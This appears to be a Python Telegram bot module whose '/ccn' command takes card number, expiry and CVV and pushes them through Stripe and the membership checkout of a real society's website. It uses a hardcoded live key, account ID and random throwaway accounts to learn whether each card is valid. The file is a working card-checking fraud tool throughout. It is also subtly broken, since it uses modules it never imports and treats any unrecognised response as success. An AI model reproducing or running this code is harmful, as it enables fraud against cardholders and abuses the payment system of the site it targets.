import requests
from pyrogram import Client, filters
from EQUROBOT import app

# Function to charge the card
def charge_card(cc, cvv, mes, ano):
    url_payment_method = "https://api.stripe.com/v1/payment_methods"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data_payment_method = {
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mes,
        "card[exp_year]": ano,
        "guid": "9fea8358-f504-43c4-8eed-489710ecf55d9d7e95",
        "muid": "42a9762c-bd73-4fa2-859d-a3a90ed3582849dfbb",
        "sid": "0159958d-faa4-4c5f-b975-2b29e5aec045903175",
        "pasted_fields": "number",
        "payment_user_agent": "stripe.js/5b578795ab; stripe-js-v3/5b578795ab; split-card-element",
        "referrer": "https://www.americannamesociety.org",
        "time_on_page": 46114,
        "key": "pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX",
        "_stripe_account": "acct_1HoFg7Gz3fb7JEO6"
    }

    response = requests.post(url_payment_method, headers=headers, data=data_payment_method)
    if response.status_code != 200:
        return f"Error in creating payment method: {response.text}"

    response_json = response.json()
    payment_method_id = response_json.get("id", "")

    if not payment_method_id:
        return "Failed to get payment method ID."

    url_checkout = "https://www.americannamesociety.org/membership-account/membership-checkout/?level=8"
    m = ''.join(random.choices(string.ascii_lowercase, k=9))
    p = ''.join(random.choices(string.ascii_lowercase, k=9))
    data_checkout = {
        "pmpro_level": 8,
        "checkjavascript": 1,
        "username": m,
        "password": p,
        "password2": p,
        "bemail": f"{m}@ikangou.com",
        "bconfirmemail": f"{m}@ikangou.com",
        "fullname": "",
        "pmpmailingadd": "1003 adress",
        "CardType": "visa",
        "pmpro_checkout_nonce": "54f3583425",
        "_wp_http_referer": "/membership-account/membership-checkout/?level=8",
        "submit-checkout": 1,
        "javascriptok": 1,
        "payment_method_id": payment_method_id,
        "AccountNumber": "XXXXXXXXXXXX2377",
        "ExpirationMonth": mes,
        "ExpirationYear": ano
    }

    headers_checkout = {
        "Origin": "https://www.americannamesociety.org",
        "Priority": "u=0, i",
        "Referer": "https://www.americannamesociety.org/membership-account/membership-checkout/?level=8",
        "Sec-Ch-Ua": "\"Not)A;Brand\";v=\"99\", \"Brave\";v=\"127\", \"Chromium\";v=\"127\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Sec-Gpc": 1,
        "Upgrade-Insecure-Requests": 1,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    response_checkout = requests.post(url_checkout, headers=headers_checkout, data=data_checkout)

    if "Your card has insufficient funds." in response_checkout.text or "Your card's security code is incorrect." in response_checkout.text:
        return "CVV or Insufficient funds issue."
    elif "Your card number is incorrect" in response_checkout.text:
        return "Card number is incorrect."
    else:
        return "Payment processed successfully."

# 
@app.on_message(filters.command("ccn"))
def ccn_handler(client, message):
    try:
        _, card_details = message.text.split()
        cc, mes, ano, cvv = card_details.split('|')
        result = charge_card(cc, cvv, mes, ano)
        message.reply_text(result)
    except Exception as e:
        message.reply_text(f"An error occurred: {str(e)}")
